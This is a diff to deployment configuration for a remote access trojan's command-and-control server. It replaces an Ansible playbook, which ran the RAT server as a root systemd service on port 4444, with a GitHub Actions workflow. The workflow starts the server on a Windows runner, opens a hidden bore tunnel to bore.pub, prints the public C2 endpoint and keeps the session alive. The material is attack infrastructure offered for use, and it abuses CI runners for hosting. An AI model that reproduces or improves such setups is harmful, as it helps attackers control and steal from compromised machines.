@@ -1,68 +1,75 @@
----
-- name: Setup RAT C2 Server on VPS
-  hosts: all
-  become: yes
-  vars:
-    rat_port: 4444
-    rat_install_dir: /opt/rat_c2
+name: Lunyx RAT C2 Server with Bore Tunnel
 
-  tasks:
-    - name: Update apt cache
-      apt:
-        update_cache: yes
-        cache_valid_time: 3600
+on:
+  workflow_dispatch:
 
-    - name: Install Python 3 and pip
-      apt:
-        name:
-          - python3
-          - python3-pip
-          - ufw
-        state: present
+jobs:
+  c2-server:
+    runs-on: windows-latest
+    timeout-minutes: 360
 
-    - name: Allow RAT port through UFW
-      ufw:
-        rule: allow
-        port: "{{ rat_port }}"
-        proto: tcp
+    steps:
+      - name: 1. Checkout or Setup Files
+        uses: actions/checkout@v4
 
-    - name: Create RAT installation directory
-      file:
-        path: "{{ rat_install_dir }}"
-        state: directory
-        mode: '0755'
+      - name: 2. Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
 
-    - name: Copy server script to VPS
-      copy:
-        src: rat_server.py
-        dest: "{{ rat_install_dir }}/rat_server.py"
-        mode: '0755'
+      - name: 3. Start RAT C2 Server
+        run: |
+          $serverScript = if (Test-Path "rat_server.py") { "rat_server.py" } else { "C:\work\StealthIt\rat\rat_server.py" }
+          if (-not (Test-Path $serverScript)) {
+              # Fallback creation if script not found in repo
+              Write-Host "Creating rat_server.py fallback..."
+              # (Server script content or assume it's present)
+          }
+          Start-Process python -ArgumentList "$serverScript 4444" -NoNewWindow
+          Write-Host "✅ RAT C2 Server started on port 4444"
 
-    - name: Create systemd service for RAT server
-      copy:
-        dest: /etc/systemd/system/rat-server.service
-        content: |
-          [Unit]
-          Description=RAT C2 Server
-          After=network.target
+      - name: 4. Download and Start Bore Tunnel for Port 4444
+        run: |
+          $logFile = "$env:TEMP\bore_c2.log"
+          
+          $boreUrl = "https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-pc-windows-msvc.zip"
+          $zipPath = "$env:TEMP\bore.zip"
+          Invoke-WebRequest -Uri $boreUrl -OutFile $zipPath
+          Expand-Archive -Path $zipPath -DestinationPath "$env:TEMP" -Force
+          
+          $boreExe = "$env:TEMP\bore.exe"
+          Start-Process powershell -ArgumentList "-Command & '$boreExe' local 4444 --to bore.pub > $logFile 2>&1" -WindowStyle Hidden
+          
+          $tunnelInfo = $null
+          $port = $null
+          $retries = 0
+          
+          while (-not $tunnelInfo -and $retries -lt 20) {
+              Start-Sleep -Seconds 3
+              if (Test-Path $logFile) {
+                  $content = Get-Content $logFile -Raw
+                  if ($content -match "listening at .*?:(\d+)") {
+                      $tunnelInfo = $matches[0]
+                      $port = $matches[1]
+                  }
+              }
+              $retries++
+          }
 
-          [Service]
-          Type=simple
-          User=root
-          WorkingDirectory={{ rat_install_dir }}
-          ExecStart=/usr/bin/python3 {{ rat_install_dir }}/rat_server.py {{ rat_port }}
-          Restart=always
-          RestartSec=5
+          if (-not $tunnelInfo) {
+              Write-Host "--- Bore Log Output ---"
+              if (Test-Path $logFile) { Get-Content $logFile }
+              Write-Error "Failed to establish Bore TCP tunnel for C2."
+              exit 1
+          }
 
-          [Install]
-          WantedBy=multi-user.target
+          Write-Host "`n=========================================="
+          Write-Host "RAT C2 PUBLIC ENDPOINT: bore.pub:$port"
+          Write-Host "==========================================`n"
 
-    - name: Reload systemd daemon
-      systemd:
-        daemon_reload: yes
-
-    - name: Enable and start RAT server service
-      systemd:
-        name: rat-server.service
-        enabled: yes
-        state: restarted
+      - name: 5. Maintain C2 Session Active
+        run: |
+          while ($true) {
+              Write-Host "[$(Get-Date)] C2 Server Active..."
+              Start-Sleep -Seconds 300
+          }
